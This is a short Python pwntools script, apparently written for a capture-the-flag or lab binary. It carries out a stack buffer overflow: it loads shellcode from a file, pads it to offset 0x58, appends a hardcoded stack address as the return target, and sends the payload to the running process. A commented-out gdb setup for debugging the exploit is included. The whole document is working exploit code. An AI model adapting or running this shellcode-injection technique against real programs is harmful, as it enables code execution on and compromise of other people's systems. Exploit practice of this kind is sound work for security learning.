#!/usr/bin/python3
from pwn import *

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb = '''
set disassembly-flavor intel
break *0x401aa9
c
display/8i $rip
display/x $rbp
display/x $rsp
display/20g $rsp
'''

p = process()
#p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])

with open("asm/smalltext", "rb") as f:
    shellcode = f.read()
shellcode = bytes(shellcode)
shellcode += bytes.fromhex("41" * (int("0x58", 16) - len(shellcode)))
shellcode += p64(0x7fffffffd1c0)
size = bytes(str(int(len(shellcode))),encoding="utf-8")
print(f"[!] sz: {size}")

p.recv()
p.sendline(size)
p.recv()
p.sendline(shellcode)
print(p.recv().split(b"\n")[1].decode())
